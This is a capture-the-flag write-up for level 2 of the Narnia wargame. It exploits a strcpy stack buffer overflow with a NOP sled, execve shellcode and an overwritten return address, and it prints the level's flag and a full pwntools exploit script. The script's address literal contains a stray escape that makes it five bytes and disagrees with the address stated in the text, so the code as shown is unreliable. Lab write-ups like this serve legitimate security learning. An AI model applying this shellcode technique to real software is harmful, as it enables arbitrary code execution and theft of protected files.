
## 2 -> 3

### Writeup

In the source code provided, we can see that the programmer has chosen to use `strcpy` to put user input into a buffer of 128 bytes. This is potentially a stack-based buffer overflow vulnerability, as `strcpy` doesn’t have a bound on the number of bytes it can read; instead, it reads until it sees the null terminator character. With this vulnerability, we can overwrite the return address of `main` to jump to code that we have made, allowing arbitrary code execution.

To begin crafting the payload, I had to figure out how many bytes I actually had to write to the buffer before the return address was changed. This can be achieved by looking at the assembler code using radare2.

```c
[0x08049186]> pdf
            ; CODE XREF from loc.__wrap_main @ 
┌ 83: int main (int argc, char **argv, char **envp);
│ `- args(sp[0x4..0x8]) vars(1:sp[0x84..0x84])
│           0x08049186      55             push ebp
│           0x08049187      89e5           mov ebp, esp
│           0x08049189      83c480         add esp, 0xffffff80
```

In plaintext, these assembler instructions are:

1. Save the caller’s base pointer to the stack.
2. Make the new base pointer the old stack pointer.
3. Make space for 128 more bytes on the stack.

Remembering that the host machine is 32-bit x86 architecture, this reveals that our stack looks like this:

```
[return address (4 bytes)] 
[old base pointer (4 bytes)] 
[128 bytes for the buffer]
```

Knowing this, we know our payload has to be 136 bytes long, with the final 4 bytes being an address.

The plan here is to put shellcode into the rest of the buffer, then point the program to run that by making the return address where the shellcode/NOP sled is in the stack. 

To find this address we use gdb and look at the stack (`x/50wx $esp`) after we crash the program with a segmentation fault. For the captured output below, I have already built a payload consisting of NOP instructions + address BBBB at the end.

```
(gdb) x/50wx $esp
0xffffd2c0:	0xffffd2c8	0xffffd580	0x90909090	0x90909090
0xffffd2d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd2e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd2f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd300:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd310:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd320:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd330:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd340:	0x90909090	0x90909090	0x90909090	0x42424242
...
```

The snapshot features the memory that contains our NOP sled near the bottom. Highlighted on the bottom left is the address that we are going to jump to. The final payload then becomes `[NOP sled] [shellcode] [0xffffd5a0]`: 136 bytes total. This payload worked and gave us our flag!

```text
narnia2@narnia:/tmp/tmp.M7dxLs4ML2$ /narnia/narnia2 $(python3 argv_overflow.py)
F5AYQwE8PA
```

<details>
  <summary>Flag</summary>F5AYQwE8PA
</details>

### Exploit

The script used was `argv_overflow.py`:

```python
from pwn import *
import sys

context.arch = 'i386'
context.bits = 32
context.os = 'linux'

# These two variables change based on the challenge
total_bytes = 136
address = b"\xa0\xd5\2\xff\xff"

shellcode = asm(shellcraft.execve('/bin/cat', ['/bin/cat', '/etc/narnia_pass/narnia3']))  # Also change
nop = b"\x90" * (total_bytes - len(shellcode) - len(address))

payload = b"".join([nop, shellcode, address])
sys.stdout.buffer.write(payload)
```